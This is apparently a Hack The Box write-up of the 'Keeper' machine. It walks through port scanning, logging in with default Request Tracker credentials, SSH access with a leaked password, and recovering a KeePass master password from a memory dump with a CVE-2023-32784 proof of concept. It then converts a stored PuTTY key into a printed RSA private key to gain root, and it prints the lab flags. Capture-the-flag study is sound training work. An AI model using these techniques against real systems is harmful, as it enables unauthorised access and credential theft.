# Keeper
## Enumeration
### Port Scanning
The system got two open ports: 22 and 80
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$ nmap $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 10:53 EDT
Nmap scan report for 10.10.11.227
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
12345/tcp open  netbus

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$ nmap -sV -sC $IP        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 10:53 EDT
Nmap scan report for 10.10.11.227
Host is up (0.052s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$ 
```
### HTTP
Assessing the webserver redirects us to `tickets.keeper.htb/rt/`:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$ curl $IP
<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$
```

The server runs an application called Request Tracker:
![Request Tracker](./images/request_tracker.png)

### Admin login
A quick research reveals that the application has the default credentials `root:password` (see https://forum.bestpractical.com/t/default-password/20088). Using them logs us into the admin panel:
![Admin panel](./images/admin_panel.png)

### Tickets
The application is a ticket system. We can't do much in here but there is an open ticket:
![Ticket](./images/ticket.png)

The history says, that there was an attachment, but it was removed for security reasons:
![History](./images/ticket_history.png)

### User
The ticket was opened by a user called `Lise Nørgaard`. Via the admin options we can open the user to get more information:
![User information](./images/user.png)

We find the information that there is a Unix login for the user called `lnorgaard` and a comment that says `New user. Initial password set to Welcome2023!`.

## SSH Login
Let's try those credentials for a SSH login on the server:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper]
└─$ ssh lnorgaard@10.10.11.227  
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
```

It worked.

### User flag
In the home directory of the user is the user flag located:
```
lnorgaard@keeper:~$ ls -al 
total 85384
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25 20:00 .
drwxr-xr-x 3 root      root          4096 May 24 16:09 ..
lrwxrwxrwx 1 root      root             9 May 24 15:55 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23 14:43 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23 14:43 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24 16:09 .cache
-rw------- 1 lnorgaard lnorgaard      807 May 23 14:43 .profile
-rw-r--r-- 1 root      root      87391651 Oct 31 16:34 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24 10:25 .ssh
-rw-r----- 1 root      lnorgaard       33 Oct 31 16:21 user.txt
-rw-r--r-- 1 root      root            39 Jul 20 19:03 .vimrc
lnorgaard@keeper:~$ cat user.txt 
2017bef02cca9926725465df291dd9f9
lnorgaard@keeper:~$ 
```

## System Enumeration
### Mail
In the login information is a notice that we have a mail:
```
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
```

But that mail belongs to the ticket and gives no more information than the ticket history.

### KeePass
As written in the ticket, the attachment was removed and stored in the home directory. We can find this file:
```
lnorgaard@keeper:~$ ls -al RT30000.zip 
-rw-r--r-- 1 root root 87391651 Oct 31 16:44 RT30000.zip
lnorgaard@keeper:~$ 
```

Downloading and extracting reveals a dmp crash report and a KeePass database:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ ls -al 
total 247476
drwxr-xr-x 2 kali kali      4096 Oct 31 11:44 .
drwxr-xr-x 3 kali kali      4096 Oct 31 11:44 ..
-rwxr-x--- 1 kali kali 253395188 May 24 06:51 KeePassDumpFull.dmp
-rwxr-x--- 1 kali kali      3630 May 24 06:51 passcodes.kdbx
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ file KeePassDumpFull.dmp                     
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ file passcodes.kdbx     
passcodes.kdbx: Keepass password database 2.x KDBX
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ 
```

#### Cracking password
At first I tried to crack the password via john:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ keepass2john passcodes.kdbx > keepasshash.txt
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ cat keepasshash.txt
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ john --wordlist=/home/kali/Desktop/tools/rockyou.txt keepasshash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:52 0.03% (ETA: 2023-11-02 11:59) 0g/s 100.1p/s 100.1c/s 100.1C/s ilovetim..anggandako
0g 0:00:04:53 0.18% (ETA: 2023-11-02 09:08) 0g/s 106.0p/s 106.0c/s 106.0C/s 251200..230591
0g 0:00:10:24 0.39% (ETA: 2023-11-02 08:38) 0g/s 107.0p/s 107.0c/s 107.0C/s 881207..777777777777777
0g 0:00:32:31 1.21% (ETA: 2023-11-02 08:38) 0g/s 105.1p/s 105.1c/s 105.1C/s batugan..batman90



```
But that didn't seem to be the right way.


So maybe the dump is more important. I searched for extracting credentials from a KeePass dump and found the [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784). I remember this recent vulnerability. This makes it possible to find the master password after a certain pattern in the memory dump.

So I tried this [PoC](https://github.com/vdohney/keepass-password-dumper) to dump the password from the minidump:
```
┌──(kali㉿kali)-[~/…/hackthebox/keeper/RT30000/keepass-password-dumper]
└─$ dotnet run ../KeePassDumpFull.dmp

Welcome to .NET 7.0!
---------------------
SDK Version: 7.0.403

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------
Write your first app: https://aka.ms/dotnet-hello-world
Find out what's new: https://aka.ms/dotnet-whats-new
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli
--------------------------------------------------------------------------------------
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø

[...]

Found: ●c
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
                                                                                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/hackthebox/keeper/RT30000/keepass-password-dumper]
└─$  
```

That seems good. We found a part of the password: `dgrød med fløde`

The first two character are not possible to dump. The first one can't be found, and the second one is one of those ``{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}``

But if we throw the partial password into a searching machine we get a suggestion: `Did you mean: rødgrød med fløde`

This is danish for _red porridge with cream_. A traditional sweet fruit dish from Denmark and Northern Germany. In Germany, we say _rote Grütze_.

#### KeePass Database
We can now use this password to open the password database:
![KeePass Database](./images/keepass.png)

And if we inspect the first entry, we find the password `F4><3K0nd!` for the root user:
![Root password](./images/root_pass.png)

## Root Login
### Generate SSH key
The password itself doesn't work via `su` or `ssh`. But there is also a SSH key in form of a PuTTY .ppk file in the notes of the KeePass entry:
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

We can use `puttygen` to extract the private SSH key:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ /usr/bin/puttygen ssh_key -O private-openssh -o id_rsa
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ cat id_rsa     
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
NdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6joDni1wZdo7hTpJ5Zjdmz
wxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCihkmyZTZOV9eq1D6P1uB6A
XSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputYf7n24kvL0WlBQThsiLkK
cz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzTVkCew1DZuYnYOGQxHYW6
WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivzUXjcCAviPpmSXB19UG8J
lTpgORyhAoGBAPaR+FID78BKtzThkhVqAKB7VCryJaw7Ebx6gIxbwOGFu8vpgoB8
S+PfF5qFd7GVXBQ5wNc7tOLRBJXaxTDsTvVy+X8TEbOKfqrKndHjIBpXs+Iy0tOA
GSqzgADetwlmklvTUBkHxMEr3VAhkY6zCLf+5ishnWtKwY3UVsr+Z4f1AoGBAK28
/Glmp7Kj7RPumHvDatxtkdT2Iaecl6cYhPPS/OzSFdPcoEOwHnPgtuEzspIsMj2j
gZZjHvjcmsbLP4HO6PU5xzTxSeYkcol2oE+BNlhBGsR4b9Tw3UqxPLQfVfKMdZMQ
a8QL2CGYHHh0Ra8D6xfNtz3jViwtgTcBCHdBu+lZAoGAcj4NvQpf4kt7+T9ubQeR
RMn/pGpPdC5mOFrWBrJYeuV4rrEBq0Br9SefixO98oTOhfyAUfkzBUhtBHW5mcJT
jzv3R55xPCu2JrH8T4wZirsJ+IstzZrzjipe64hFbFCfDXaqDP7hddM6Fm+HPoPL
TV0IDgHkKxsW9PzmPeWD2KUCgYAt2VTHP/b7drUm8G0/JAf8WdIFYFrrT7DZwOe9
LK3glWR7P5rvofe3XtMERU9XseAkUhTtqgTPafBSi+qbiA4EQRYoC5ET8gRj8HFH
6fJ8gdndhWcFy/aqMnGxmx9kXdrdT5UQ7ItB+lFxHEYTdLZC1uAHrgncqLmT2Wrx
heBgKQKBgFViaJLLoCTqL7QNuwWpnezUT7yGuHbDGkHl3JFYdff0xfKGTA7iaIhs
qun2gwBfWeznoZaNULe6Khq/HFS2zk/Gi6qm3GsfZ0ihOu5+yOc636Bspy82JHd3
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ 
```

That done, we can finally login as root:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/keeper/RT30000]
└─$ ssh -i id_rsa root@10.10.11.227       
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 
```

### Root flag
In the `/root` directory is the root flag located:
```
root@keeper:~# ls -al 
total 85384
drwx------  5 root root     4096 Jul 27 13:57 .
drwxr-xr-x 18 root root     4096 Jul 27 13:52 ..
lrwxrwxrwx  1 root root        9 May 24 15:54 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc
drwx------  2 root root     4096 May 24 16:58 .cache
-rw-------  1 root root       20 Jul 27 13:57 .lesshst
lrwxrwxrwx  1 root root        9 May 24 15:54 .mysql_history -> /dev/null
-rw-r--r--  1 root root      161 Dec  5  2019 .profile
-rw-r-----  1 root root       33 Oct 31 16:21 root.txt
-rw-r--r--  1 root root 87391651 Jul 25 19:56 RT30000.zip
drwxr-xr-x  2 root root     4096 Jul 25 20:11 SQL
drwxr-xr-x  2 root root     4096 May 24 16:09 .ssh
-rw-r--r--  1 root root       39 Jul 20 19:03 .vimrc
root@keeper:~# cat root.txt 
82318d75081c55e6a7cb3263e6aa3273
root@keeper:~# 
```